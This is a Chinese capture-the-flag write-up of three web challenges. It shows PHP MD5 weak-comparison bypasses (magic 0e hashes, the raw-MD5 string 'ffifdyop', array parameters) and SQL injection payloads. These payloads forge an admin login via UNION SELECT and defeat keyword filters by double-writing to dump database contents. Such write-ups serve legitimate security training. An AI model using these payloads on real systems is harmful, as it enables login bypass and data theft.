弱类型md5题目

[BJDCTF2020]Easy MD5

抓包后看到如下关键代码：

一个特殊的字符ffifdyop：md5加密后的结果再经过ASCII转换后，前几位的结果是 'or'6 ，这刚好是一个mysql查询万能密码，

源代码的mysql查询语句就有可能

从 select * from 'admin' where password=md5($pass,true)

变成 select * from 'admin' where password=''or'6xxxxx' 从而完成查询

简单的弱类型相等，只要做到a和b的值不一样，但md5值都是0e开头即可

?a=s155964671&b=240610708

$a md5($a)
s155964671a 0e342768416822451524974117254469
240610708 0e462097431906509019562988736854
QNKCDZO 0e830400451993494058024219903391
0e00928251504 0e148856674729228041723861799600

md5的数组绕过，在php中数组的md5值为NULL，即md5(array($a))==NULL，所以只需要传递param1和param2两个数组类型的不同的值就可以了

hackbar中post传入 param1[]=1&param2[]=2

sql注入、md5、大小写绕过

[GXYCTF2019]BabySQli

简单尝试可知，UserName为admin

注入点UserName有很多字符过滤，尝试大写字母的 ORDER BY 发现可以绕过

111' ORDER BY 1;# 尝试查询发现共3个字段，可以知道的是，这三个字段一个是UserName，一个是password

111' UNION SELECT 1,'admin',3;# 将字符串 ‘admin’，依次放入第一二三字段尝试，当在第二字段时提示 wrong password

可知第二字段存放UserName

到这时，只需要找到存放password的字段，将任意一个数的md5值放到该字段，再在password框中输入这个数即可

如下，随意一个数 666 的md5值为 fae0b27c451c728867a567e8c1bb4e53

UserName 框：111' UNION SELECT 1,'admin','fae0b27c451c728867a567e8c1bb4e53';#

password 框：666

即可成功登录，得到flag

sql注入、双写绕过

[极客大挑战 2019]BabySQL

1' or 1=1;# 尝试万能密码，出现sql报错，但不确定原因

1' order by 1;# 尝试查看字段数，可以看出or 和 by被过滤了

1' oorrder bbyy 1;# 双写绕过成功，查到共3个字段

1' union select 1,2,3;# 联合查询，通过报错提示大概可以知道，union select 也被过滤了

1' ununionion seselectlect 1,2,3;# 双写绕过，看到回显位置

1' ununionion seselectlect 1,2,group_concat(schema_name) from information_schema.schemata;# 已知or被过滤了，猜测关键字from也可能被过滤了

1' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata;# 查询成功，得到所有的数据库名

1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables wwherehere table_schema=database()# 查询当前数据库中所有表名，关键字where 也被过滤了

1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql';# 查询表名为b4bsql的所有字段名

1' ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql;# 查询表名为b4bsql的字段为passowrd的所有数据，得到flag

注意：

  1. 单词的拼写，双写绕过的单词很容易拼错
  2. 具体是哪些关键字被绕过了，要看给出的sql报错语句，还要加以猜测
  3. 只有被过滤的具体单词或几个字母才能用双写绕过，比如or 这两个字母被过滤了，那order 就只能双写成oorrder绕过过滤
  4. 变量名在有些地方要有引号，有些地方则不需要

本题中数据库名为ctf 的数据库中也存有flag

1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'# 得到数据库ctf中的表名Flag

1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'# 查询表名为Flag的所有字段名，得到flag

1' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag# 查询ctf库中Flag表的flag字段的内容，得到flag
